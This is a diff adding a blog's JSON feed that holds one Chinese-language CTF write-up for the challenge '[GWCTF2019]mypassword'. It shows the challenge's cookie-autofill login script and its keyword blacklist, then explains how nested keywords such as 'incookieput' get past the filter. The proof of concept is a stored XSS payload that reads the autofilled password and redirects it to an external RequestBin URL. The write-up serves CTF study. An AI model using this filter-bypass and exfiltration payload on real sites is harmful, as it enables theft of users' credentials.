@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"xss攻击\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/08/31/GWCTF2019-mypassword/",
+            "url": "http://odiws.github.io/2024/08/31/GWCTF2019-mypassword/",
+            "title": "[GWCTF2019]mypassword",
+            "date_published": "2024-08-31T15:05:00.000Z",
+            "content_html": "<h2 id=\"gwctf-2019mypassword\"><a class=\"markdownIt-Anchor\" href=\"#gwctf-2019mypassword\">#</a> [GWCTF 2019]mypassword</h2>\n<p>注册登录</p>\n<p><img data-src=\"../images/%5BRoarCTF2019%5DOnlineProxy/1.png\" alt=\"1\"></p>\n<p><img data-src=\"../images/%5BRoarCTF2019%5DOnlineProxy/2.png\" alt=\"2\"></p>\n<p>这里加载了一个 js 文件<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzYwZDQ4N2I0LTA0ZDItNGUzMy05YWFkLWZiZTAyNjRjNWFjNi5ub2RlMy5idXVvai5jbi9qcy9sb2dpbi5qcw==\"> 60d487b4-04d2-4e33-9aad-fbe0264c5ac6.node3.buuoj.cn/js/login.js</span></p>\n<pre><code>if (document.cookie &amp;&amp; document.cookie != '') &#123;\n\tvar cookies = document.cookie.split('; ');\n\tvar cookie = &#123;&#125;;\n\tfor (var i = 0; i &lt; cookies.length; i++) &#123;\n\t\tvar arr = cookies[i].split('=');\n\t\tvar key = arr[0];\n\t\tcookie[key] = arr[1];\n\t&#125;\n\tif(typeof(cookie['user']) != &quot;undefined&quot; &amp;&amp; typeof(cookie['psw']) != &quot;undefined&quot;)&#123;\n\t\tdocument.getElementsByName(&quot;username&quot;)[0].value = cookie['user'];\n\t\tdocument.getElementsByName(&quot;password&quot;)[0].value = cookie['psw'];\n\t&#125;\n&#125;\n</code></pre>\n<p>可以看出，用户名和密码都填入了表单<br>\n登录成功后有一个 feedback.php 的用户反馈</p>\n<p><img data-src=\"../images/%5BRoarCTF2019%5DOnlineProxy/4.png\" alt=\"4\"></p>\n<p>可以看出，用户名和密码都填入了表单<br>\n登录成功后有一个 feedback.php 的用户反馈</p>\n<p>在这个页面的源码中存在注释</p>\n<pre><code>\t\tif(is_array($feedback))&#123;\n\t\t\techo &quot;&lt;script&gt;alert('反馈不合法');&lt;/script&gt;&quot;;\n\t\t\treturn false;\n\t\t&#125;\n\t\t$blacklist = ['_','\\'','&amp;','\\\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];\n\t\tforeach ($blacklist as $val) &#123;\n\t        while(true)&#123;\n\t            if(stripos($feedback,$val) !== false)&#123;\n\t                $feedback = str_ireplace($val,&quot;&quot;,$feedback);\n\t            &#125;else&#123;\n\t                break;\n\t            &#125;\n\t        &#125;\n\t    &#125;\n</code></pre>\n<p>审计代码可以看出对输入的内容有过滤，但是只是替换为空很容易绕过，例如是 incookieput 的话，替换后会剩下 input。由于 login.js 中有记录密码的功能，所以我们可以构造一个表单在 feedback 页面提交，在 <span class=\"exturl\" data-url=\"aHR0cDovL2h0dHAucmVxdWVzdGJpbi5idXVvai5jbg==\">http://http.requestbin.buuoj.cn</span> （RequestBin 提供了一个 URL，该 URL 将收集对其发出的请求，首页点击 create a requestbin）页面接收 flag</p>\n<p><img data-src=\"../images/%5BRoarCTF2019%5DOnlineProxy/5.png\" alt=\"5\"></p>\n<pre><code>poc\n\n&lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;\n&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;\n&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;\n&lt;scrcookieipt&gt;\n    var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;\n    docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/1e8jfct1/?a=&quot;+psw;\n&lt;/scrcookieipt&gt;\n</code></pre>\n<p><img data-src=\"../images/%5BRoarCTF2019%5DOnlineProxy/6.png\" alt=\"6\"></p>\n<p>参考链接：</p>\n<p>[BUUCTF：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTA1MzQ0NTYz\">GWCTF 2019] mypassword_ctf mypassword-CSDN 博客</span></p>\n",
+            "tags": [
+                "buuctf",
+                "xss攻击"
+            ]
+        }
+    ]
+}
